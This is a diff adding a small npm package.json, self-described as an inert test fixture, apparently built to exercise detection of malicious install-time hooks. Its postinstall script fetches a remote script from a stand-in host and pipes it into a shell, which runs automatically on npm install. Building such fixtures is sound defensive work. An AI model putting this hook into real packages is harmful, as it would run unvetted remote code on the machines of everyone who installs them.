@@ -1,0 +1,8 @@
+{
+  "name": "evil-postinstall",
+  "version": "1.0.0",
+  "comment": "INERT TEST FIXTURE. The classic install-time hook: a remote script fetched and piped straight into a shell, executed automatically on npm install.",
+  "scripts": {
+    "postinstall": "curl -s https://example.invalid/payload.sh | sh"
+  }
+}
